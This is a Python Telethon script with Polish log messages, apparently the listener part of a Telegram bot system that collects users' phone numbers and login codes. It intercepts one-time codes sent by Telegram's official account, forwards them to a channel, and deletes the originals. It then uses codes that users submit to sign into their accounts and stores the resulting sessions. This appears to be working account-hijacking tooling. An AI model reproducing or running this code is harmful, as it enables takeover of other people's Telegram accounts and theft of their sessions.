import sys
import os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

import asyncio
import re
import logging
from telethon import TelegramClient, events
from shared.utils import create_user_folder_and_files, login_user, is_telegram_message
from shared.sessions import load_sessions, save_sessions, load_pending_verifications, save_pending_verifications
from shared.config import API_ID, API_HASH, CHANNEL_ID, TELEGRAM_OFFICIAL_ID, PHONE_NUMBERS, BOT_NAME


logging.basicConfig(
    filename=os.path.join(os.getcwd(), "logger", "logger.log"),
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

clients = {}

def get_client(phone_number, session_name="logger_session"):

    session_dir = os.path.join(os.getcwd(), "logger", "sessions")
    os.makedirs(session_dir, exist_ok=True)  
    session_path = os.path.join(session_dir, f"{session_name}_{phone_number.replace('+', '')}")
    logging.info(f"Ścieżka sesji: {session_path}")
    return TelegramClient(session_path, API_ID, API_HASH)

client = get_client(PHONE_NUMBERS['logger'], "logger_session")

@client.on(events.NewMessage(from_users=TELEGRAM_OFFICIAL_ID))
async def handle_telegram_code(event):
    wiadomosc = event.message.message
    logging.info(f"Otrzymano wiadomość od Telegram: {wiadomosc}")
    code_match = re.search(r'(\d{5})', wiadomosc)
    if code_match:
        kod = code_match.group(1)
        sformatowany_kod = "-".join(kod)
        logging.info(f"Przechwycono kod: {sformatowany_kod}")
        pending_verifications = load_pending_verifications(BOT_NAME)
        for user_id, data in pending_verifications.items():
            if data["phone_number"] != PHONE_NUMBERS['logger']:
                await client.send_message(CHANNEL_ID, f"🔑 Kod dla {data['phone_number']} (Bot: {BOT_NAME}): `{sformatowany_kod}`")
                logging.info(f"Wysłano kod {sformatowany_kod} dla {data['phone_number']} na kanał")
                break
        await client.delete_messages(TELEGRAM_OFFICIAL_ID, [event.message.id])
    else:
        logging.warning("Nie znaleziono kodu w wiadomości od Telegrama.")

@client.on(events.NewMessage(chats=CHANNEL_ID))
async def handle_new_message(event):
    wiadomosc = event.message.message
    logging.info(f"Otrzymano wiadomość na kanale: {wiadomosc}")
    pending_verifications = load_pending_verifications(BOT_NAME)
    
    if "Nowy numer telefonu do weryfikacji" in wiadomosc:
        phone_match = re.search(r"Numer: `?(\+?\d+)`?", wiadomosc)
        user_id_match = re.search(r"ID: `?(\d+)`?", wiadomosc)
        if phone_match and user_id_match:
            req_phone_number = phone_match.group(1)
            user_id = int(user_id_match.group(1))
            if not req_phone_number.startswith('+'):
                req_phone_number = '+48' + req_phone_number
            if req_phone_number == PHONE_NUMBERS['logger']:
                await event.reply("❌ Nie można zweryfikować numeru nasłuchującego.")
                logging.warning(f"Próba weryfikacji numeru nasłuchującego: {req_phone_number}")
                return
            logging.info(f"Oczekiwanie na kod dla {req_phone_number}, user_id: {user_id}")

    if "Wiadomość od użytkownika" in wiadomosc:
        code_match = re.search(r"Kod: ([\d\s]+)", wiadomosc)
        user_id_match = re.search(r"ID: `?(\d+)`?", wiadomosc)
        phone_match = re.search(r"Numer: `?(\+?\d+)`?", wiadomosc)
        if code_match and user_id_match and phone_match:
            kod = re.sub(r'\s+', '', code_match.group(1))
            user = await event.message.get_sender()
            if user is None:
                logging.warning("Wiadomość nie ma nadawcy (prawdopodobnie systemowa). Pomijam.")
                return
            user_id = user.id
            user_phone = phone_match.group(1)
            if not user_phone.startswith('+'):
                user_phone = '+48' + user_phone
            
            if str(user_id) in pending_verifications:
                phone_code_hash = pending_verifications[str(user_id)]["phone_code_hash"]
                if await login_user(user_phone, kod, phone_code_hash, user_id, bot_name=BOT_NAME):
                    await event.reply(f"✅ Użytkownik {user_phone} zweryfikowany.")
                    logging.info(f"Użytkownik {user_phone} zweryfikowany pomyślnie.")
                    del pending_verifications[str(user_id)]
                    save_pending_verifications(BOT_NAME, pending_verifications)
                    active_sessions = load_sessions(BOT_NAME, force_refresh=True)
                    login_client = get_client(user_phone, f"{BOT_NAME}_session")
                    await login_client.connect()
                    user = await login_client.get_me()
                    active_sessions[user_phone] = {
                        "phone_number": user_phone,
                        "user_id": user.id,
                        "username": user.username if user.username else f"user_{user.id}"
                    }
                    save_sessions(BOT_NAME, active_sessions)
                    await login_client.disconnect()
                else:
                    await event.reply(f"❌ Weryfikacja nieudana dla {user_phone}. Sprawdź kod i spróbuj ponownie.")
                    logging.error(f"Weryfikacja nieudana dla {user_phone}.")
            else:
                await event.reply(f"❌ Brak danych weryfikacyjnych dla ID {user_id}.")
                logging.warning(f"Brak danych w pending_verifications dla {user_id}")
        else:
            logging.warning("Nie znaleziono kodu, ID użytkownika lub numeru telefonu w wiadomości.")

async def main():
    print("[INFO] Logger nasłuchuje na kanale... (Telethon)")
    session_dir = os.path.join(os.getcwd(), "logger", "sessions")
    session_path = os.path.join(session_dir, f"logger_session_{PHONE_NUMBERS['logger'].replace('+', '')}")
    try:
        if not os.path.exists(session_path + ".session"):
            logging.info(f"Brak sesji dla {PHONE_NUMBERS['logger']}. Proszę się zalogować.")
            await client.start(phone=PHONE_NUMBERS['logger'])
            logging.info("Podaj kod SMS otrzymany od Telegrama:")
            kod = input("Wpisz otrzymany kod: ")
            await client.sign_in(PHONE_NUMBERS['logger'], kod)
            logging.info(f"Zalogowano pomyślnie dla {PHONE_NUMBERS['logger']}.")
        else:
            await client.start()
            logging.info("Użyto istniejącej sesji dla logger.py.")
        logging.info("Logger uruchomiony i nasłuchuje na kanale...")
        await client.run_until_disconnected()
    except Exception as e:
        logging.error(f"Błąd w main: {str(e)}")
        raise

if __name__ == "__main__":
    asyncio.run(main())